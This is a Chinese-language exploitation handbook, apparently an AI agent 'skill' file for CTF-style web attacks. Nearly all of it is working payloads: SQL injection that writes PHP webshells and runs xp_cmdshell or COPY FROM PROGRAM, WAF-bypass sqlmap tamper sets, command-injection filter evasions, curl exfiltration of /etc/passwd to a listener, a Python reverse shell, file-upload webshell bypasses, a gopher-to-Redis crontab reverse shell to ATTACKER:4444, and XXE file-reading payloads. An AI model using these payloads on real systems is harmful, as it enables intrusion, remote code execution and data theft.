---
name: web-deep
description: Web 漏洞深度利用手册。SQL 注入数据库指纹与各库读文件/写 shell、sqlmap tamper WAF 绕过矩阵、命令注入分隔符与过滤器绕过全集、文件上传 WAF 绕过矩阵、SSRF 全协议与 gopher 链、XXE 解析器差异与报错盲提取。注入点/上传点/带参请求确认存在后用来把原语放大到取数/写文件/RCE。
---

# Web 深度利用手册

> 定位：web 基础篇确认漏洞类型后，用本节把原语放大到批量取数/写文件/RCE。所有 payload 一条命令直出，别逐步手搓。

## 1. SQL 注入 · 数据库指纹（报错文本→DBMS 秒判）
| 报错特征 | 库 |
|---|---|
| `You have an error in your SQL syntax` / `SQLSTATE[42000]` / `mysql_fetch` / `SQLException: ... near` | MySQL |
| `ERROR: ... at or near` + `LINE 1` / `PG::` / `psycopg2.errors` / `PostgreSQL` | PostgreSQL |
| `Unclosed quotation mark after the character string` / `OLE DB` / `SQL Server Native Client` / `Microsoft.*ODBC` | MSSQL |
| `ORA-00933` `ORA-01756` `ORA-01722` / `oracle.jdbc` | Oracle |
| `SQLite/JDBCDriver` / `SQLITE_ERROR` / `near "...": syntax error`（SQLite 支持 `--` 与 `/* */`，无的是 `#`/`/*!*/` 版本注释与堆叠） | SQLite |
| `com.mysql.cj.jdbc` / `org.postgresql` / 堆栈里的 driver 类名 | Java+对应库 |
| 不回显：报错全部 500 同页 → 盲注（先 `LIKE 'flag{%'` 定向） | — |

**闭合/注释差异**：MySQL `-- -` `#` `/*!50000*/`；PG/MSSQL `-- -`；Oracle `--` 空注释不能跟字符、`/* */`；MSSQL 支持堆叠+`xp_cmdshell`；PG 支持堆叠。探测顺序：`'` → `"` → `')` → `'))` → 数字型直接 `1` 变 `-1` 看响应差。

**各库原语速查**：
```bash
# MySQL 读文件/写 shell（需 FILE 权限；secure_file_priv 为 NULL 时读禁写禁）
1' AND extractvalue(1,concat(0x7e,(SELECT load_file('/etc/passwd'))))-- -
1' UNION SELECT 0x3c3f706870206576616c28245f504f53545b2778275d293b3f3e INTO OUTFILE '/var/www/html/s.php'-- -  # 0x3c3f...=<?php eval($_POST['x']);?>（0x78=x 不能省，缺了 PHP 语法错误白页）
# secure_file_priv 禁 OUTFILE/无 FILE 权限 → general_log 写 shell（需 SUPER；自研题 MySQL 常 root 起=首选链）：
;SET GLOBAL general_log=1;SET GLOBAL general_log_file='/var/www/html/s.php';-- -
;SELECT '<?php @eval($_POST[cmd]);?>';-- -
# slow_query_log 变体：SET GLOBAL slow_query_log=1;SET GLOBAL slow_query_log_file='/var/www/html/s.php';-- - 再 SELECT '<?php @eval($_POST[cmd]);?>' OR SLEEP(11);-- -
# PostgreSQL 命令执行（堆叠 + 超级用户；cmd_exec 表不存在会直接报错——先建表）：
;CREATE TABLE cmd(out text);COPY cmd FROM PROGRAM 'id';-- -   # 结果再 SELECT * FROM cmd 可见
;COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/c.php'-- -
# MSSQL（堆叠，需启用）
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'-- -
# MSSQL 任意读文件（BULK INSERT；读完 DROP TABLE t 清理）：
;CREATE TABLE t(t varchar(8000));BULK INSERT t FROM 'c:\windows\win.ini';SELECT * FROM t;-- -
# MSSQL OLE Automation 外带（目标能回连本机监听时替代 DNS；80 端口监听见 §6）：
;DECLARE @o INT;EXEC sp_oacreate 'MSXML2.ServerXMLHTTP',@o OUT;EXEC sp_oamethod @o,'open',NULL,'GET','http://ME:80/?d='+CONVERT(varchar(1000),DB_NAME());EXEC sp_oamethod @o,'send'-- -
# Oracle：UTL_HTTP 外带（离线价值低，报错取数为主）；MySQL 8 报错可用 updatexml 替代 extractvalue
```
**各库报错/延时原语**（无回显/只看得见响应差时，先定库再取数）：
```sql
MSSQL  报错 ' AND 1=CONVERT(INT,(SELECT TOP 1 DB_NAME()))-- - ；延时 ';WAITFOR DELAY '0:0:5'-- -
PG     报错 ' AND 1=CAST(VERSION() AS INT)-- - ；延时 ' AND PG_SLEEP(5)-- -
Oracle 报错(11g) ' AND (SELECT XMLType('<a>'||USER||'</a>') FROM DUAL)-- - ；延时(免权限 PUBLIC) ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -（DBMS_LOCK.SLEEP 要权限）
MySQL  8.0.19+ ' UNION TABLE users-- 直代 SELECT * FROM（绕 FROM/列名检测）
```

## 2. SQL · sqlmap tamper 分层矩阵（WAF 行为 → 选哪个）
```bash
# 全自动一条（含 tamper 自动选择 + 定向 flag 库）：
sqlmap -u "http://$T/p?id=1" --batch --tamper=between,randomcase --level=3 --risk=2 --dbms=mysql
# WAF 拦截特征 → tamper 组合（按层叠加，先单后组验证）：
# 关键字拦截(union/select/from) : space2comment, halfversionedmorekeywords
# 空格被压(URL 或 body)        : space2mysqlblank, space2mssqlblank, space2plus, space2randomblank
# = 号被拦/等值比较过滤         : equaltolike, between（注意不是 notbetween——非官方 tamper，--tamper 会直接报错）
# 引号被转义                    : apostrophemask, unmagicquotes, chardoubleencode
# 逗号被拦                     : commalesslimit, commalessmid
# IFNULL/IF 被拦                : ifnull2ifisnull, if2casewhenisnull
# 括号前拦                      : commentbeforeparentheses
# ModSecurity 关键字拦（版本注释系）: modsecurityversioned
# 全特征码拦截                  : randomcase + concat2concatws + versionedmorekeywords
# 补充（场景明确才上）：SLEEP/时间函数被拦 → sleep2getlock(MySQL5.7+)；MySQL 空格被压 → space2hash(%23%0a)
#   拦 AND/OR → symboliclogical；拦 information_schema → informationschemacomment/schemasplit；强关键字 → randomcomments
#   IP 白名单 → xforwardedfor；ASP/IIS → percentage/charunicodeencode；Access → appendnullbyte
# MySQL 强 WAF 整组：space2mysqlblank,randomcomments,versionedmorekeywords,halfversionedmorekeywords,
#   if2casewhenisnull,sleep2getlock,between,greatest,concat2concatws,chardoubleencode
# 组合示例（先用宽泛的）：
sqlmap -u URL --batch --tamper="space2comment,equaltolike,randomcase" --level 5 --risk 2
# WAF 只是词法层时：注释符版更稳
sqlmap -u URL --batch --tamper="space2comment,versionedmorekeywords" --random-agent
```
- 先 `--dbs` 再 `-D <库> --tables`，定向 `--sql-query="SELECT group_concat(...) FROM t WHERE col LIKE 'flag{%'"` 一步到位，别 `--dump` 全表。
- 页面相同但延时特征存在 → 加 `--time-sec=3 --technique=T`。
- **union 手工更快就别开 sqlmap**：判断注入类型 2-3 次请求，能 union/报错手工一条 group_concat 带走。

## 3. 命令注入（先分隔符后绕过滤，一条命令验证一类）
```bash
# 分隔符全集（按序各打一个探测，看延时/回显/错误）：
;  |  ||  &  &&  $()  ` `  %0a  %0d%0a  %0a0a  \n  （Windows 另加 %0a|、^、&&、||、&）
# 一句话盲测（sleep 区分，别全弹）：
curl -s "http://$T/ping?host=127.0.0.1%3Bsleep%203" -o /dev/null -w '%{time_total}'
# 空格被过滤：
{cat,/etc/passwd}   cat$IFS/etc/passwd   cat${IFS}/etc/passwd   X=$'cat\x20/etc/passwd';$X   cat</etc/passwd
# 关键字被过滤（黑名单逐字试）：
c''at /etc/passwd    c\at /etc/passwd    $(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)    e''cho 3|b''ase64
cat /e*t/p*s*w*d    /???/???    $(printf '\143\141\164 /etc/passwd')    $'\143\141\164' /etc/passwd
# 无回显 → 外带/反弹（目标能回连本机时；本机 python3 -m http.server 80 起监听收）：
;curl -s -d @/etc/passwd http://ME:80/                        # POST body 带文件内容
;curl -s "http://ME:80/?c=$(id|base64 -w0|tr -d '='|tr '/' '_'|tr '+' '-')"   # URL 外带
# 布尔时间判定是否 root：;if [ $(id -u) -eq 0 ]; then sleep 5; fi
# 免 nc 反弹（目标有 python3 时）：python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ME",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# 无字母数字 RCE（php 场景）：$_=[];$__=$_==$_;$___=$__.$__;...（太长——优先找已上传文件的执行点）
# 检测优先级：先 ; 和 $() 直连符 → 空格替代 → 关键字混淆；每类一次验证，命中立即停手去批量化
```

## 4. 文件上传 · 绕过矩阵（先探防护层再选策略）
```bash
# 探防护：直接传 .php 看报错（黑名单/白名单/MIME/内容检测各有特征）
# 黑名单（禁后缀）→ 变体试打一轮：
for x in phtml php3 php4 php5 php7 pht shtml jsp jspx jspf asp aspx asa cer cdx; do echo "try .$x"; done
Php pHP pHP .php. .php%00 .php%0a .php::$DATA .php/ .php;.jpg  x.php.jpg  x.jpg.php  .user.ini .htaccess
# str_replace 单次删除型黑名单（删一次 php）→ 双写：pphphp / phphpp（删中间 php 剩 .php）
# .user.ini 完整链（CGI/FastCGI 解析，同目录任一 .php 触发；先传 1.gif 再传 .user.ini）：
printf 'auto_prepend_file=1.gif\n' > .user.ini
printf 'GIF89a\n<?php eval($_POST[x]);?>' > 1.gif
# 白名单（只放行图片）→ 解析漏洞/双扩展名依赖中间件：
#   Apache: x.php.jpg 多后缀解析；.htaccess 可上传则 SetHandler application/x-httpd-php（全目录生效，比 AddType 稳）；AddType application/x-httpd-php .jpg
#   Apache 2.4.0-2.4.29 CVE-2017-15715: x.php%0a（换行绕后缀校验，校验路径≠解析路径）
#   Nginx 0.8.41-1.5.6 CVE-2013-4547: x.jpg%00.php（%00 编码绕校验）；低版本 x.jpg/x.php 空字节
#   IIS: x.asp;.jpg 分号截断
# MIME 检测 → 伪造 Content-Type: image/png + 文件头；内容检测 → 图马（一句话+尾部）：
printf 'GIF89a\n<?php eval($_POST[x]);?>' > s.php.gif
# 内容强校验（二次渲染）→ 先传合法图 → 下载渲染产物 → 把 payload 注入渲染后不变区块（如 EXIF/注释区）
# 前端校验 → 直接 curl 绕过；目录限制 → filename 带 ../ 穿到 web 根/ROOT；随机名 → 响应/页面里找路径回显
# 上传成功但不可执行（/upload 目录禁 php）→ 见 web-attack skill 的 session.upload_progress + LFI 合链（勿找 web skill——该节在 web-attack）
# 条件竞争（先检测后入库）→ race 并发脚本重复打
# 探测上传结果：upload 完立即 curl 回显路径 404 判定；JSP 场景用 msfvenom -p java/jsp_shell_reverse_tcp（本环境无 javac）
```

## 5. SSRF · 协议面与 gopher 链
```bash
# 协议面：file:// dict:// gopher:// ftp:// ldap://（http 之外逐个试）
# dict:// 单命令打内网服务（连上即证明端口开+服务类型；连接被拒=关）：
curl "dict://127.0.0.1:6379/info"          # Redis info 秒判
# Redis 未授权逐 URL 一条命令（%20 代空格；写链仍用 gopher 一次成型）：
curl "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html"
# 内网即插端点（白名单 SSRF 直接打）：Docker http://IP:2375/containers/json；ES http://IP:9200/_cat/indices；Jenkins http://IP:8080/script
# Spring actuator 经 SSRF：/actuator/env /actuator/heapdump /actuator/jolokia（泄密钥）
# gopher 万能打内网 TCP（把原始 TCP 载荷做 URL 编码，第一行不必带 Host）：
python3 - <<'EOF'
import urllib.parse
def gopher(host,port,payload):
    return "gopher://%s:%d/_%s"%(host,port,urllib.parse.quote(payload,safe=''))
# Redis 写 crontab（未授权 redis 的内网横向首选）：
redis = "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\nx\r\n$%d\r\n%s\r\n*1\r\n$4\r\nsave\r\n"
cron  = "\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\n"
print(gopher("10.0.0.5",6379, redis%(len(cron),cron)))
EOF
# → 把输出 URL 喂给 SSRF 参数；Redis 3.2+ 需先 config set dir/dbfilename 到 cron 目录再 save
# Redis 写 ssh key / web shell 同理换 payload 内容（dir /var/www/html 或 /root/.ssh；cron 内容以空行开头）
# FastCGI（PHP-FPM 9000，已知 web 路径时可 php 代码执行）：
#   payload: "<?php system($_GET[c]);?>" + PHP_ADMIN_VALUE/auto_prepend_file 构造 FCGI_BEGIN/FCGI_PARAMS 包（长度敏感，用现成脚本）
# MySQL 内网横向（gopher 到 3306 走未授权/老版本空口令读文件）：LOAD DATA LOCAL INFILE 拿不到回显，优先级低于 redis
# 云元数据经 SSRF：见 cloud skill（注意 IMDSv2 需要 PUT 方法+自定义头，多数 SSRF 打不了 v2，先试 v1 与 user-data）
# 白名单/内网过滤绕过（离线环境 DNS 重绑定基本不可用——优先无 DNS 的变体）：
#   302 跳转（url=内网URL 的开放重定向）、IPv6/十进制/短 IP 编码、@ 与 # 解析差异
```

## 6. XXE · 解析器差异与盲提取
```bash
# 解析器默认行为（禁外部实体则整个 XXE 免谈，先探测；多数主流库默认是【开】的，别先入为主判安全）：
#   Java Xerces/JAXP（DOM/SAX/StAX/SAXParserFactory/XMLReader/DBF/JAXB）: 默认启用外部实体 → 风险高，未设 feature 即可利用
#   Python lxml: 默认 resolve_entities=True → 高（勿当安全）；xml.etree: 默认不处理外部实体 → 仅 DoS 低
#   PHP libxml: <PHP8 默认开实体（无 XXE flag 时优先试），PHP8+ 默认关
#   .NET XmlDocument: 老版本默认开；C# 新模板安全
#   libxml2 C 系（Ruby/Perl/PHP 早期）: 宽松
# 探测三件套（先参数实体内网盲测再文件读）：
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
# 无回显 → 报错盲提取（王牌，不需要外带通道）：
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd "<!ENTITY &#x25; b SYSTEM 'file:///nonexist/%f;'>"> %dtd;]><r/>
# 上例报错信息会回显 base64 的文件内容（错误消息含路径段）——多文件时一次一个，配合 python 解 base64
# Java 平台无 php://filter → 本地 DTD 报错盲提取（内部子集重定义本地 DTD 的参数实体，放宽“参数实体不能引参数实体”限制）：
<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"><!ENTITY % condition 'aaa<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;>">%eval;%error;'>%condition;]>
#   DTD 路径不存在时换目标 JVM/容器内其它含参数实体的 .dtd（dtd-finder 扫）
# 外带通道（目标能回连我们时）：本地监听收
python3 -c "import socket;s=socket.socket();s.bind(('0.0.0.0',80));s.listen(1);c,_=s.accept();print(c.recv(4096))" &
# 实体进 URL 用 http://IP:80/?%file; → 监听日志里读内容；文件含特殊字符用 CDATA 包（%start;%file;%end; 三段参数实体）
# SVG/Excel(xlsx)/PDF 上传解析场景同 payload；XInclude：<xi:include xmlns:xi="..."> 绕过纯 XML 实体被禁
# 高价值目标文件：/etc/passwd /proc/self/environ（env 常有 flag/密钥）/flag* /home/*/flag* 应用配置 application.yml config.php
```

## 7. 新组件 CVE 判定（命中版本即打）
```
# Node fast-xml-parser ≤5.3.4（默认 processEntities=true）CVE-2026-25896：实体名含 "." 触发 shadow 内建实体，默认配置即触发：
<!DOCTYPE foo [<!ENTITY l. "<img src=x onerror=alert(1)>">]>
#   → 解析输出进页面=XSS；拼接 SQL=注入（先看输出位置）
# Apache CXF WSDL import XXE CVE-2026-65432（<4.2.3/4.1.8/3.6.12）：顶层硬化后 import 未硬化——打 WSDL <import> 外实体
# Apache Tika ≤3.2.1 CVE-2025-66516（CVSS 10）：PDF XFA 流内嵌 XXE → 读文件（上传解析类功能先探版本再上）
# Nokogiri/JRuby <1.19.4 CVE-2026-57234：NONET 防护失效 → SSRF
```

## 关键规则
- 每类原语「探测 1-2 次确认类型 → 直接上本节最大倍率 payload」，禁止在中间态反复空试
- 取数永远优先报错/UNION/堆叠直读，盲注只用来做最后定位；flag 定向 `LIKE 'flag{%'`
- 写文件/执行原语到手立即跑 web-attack skill 的「批量化组合拳」把 flag 一次捞全
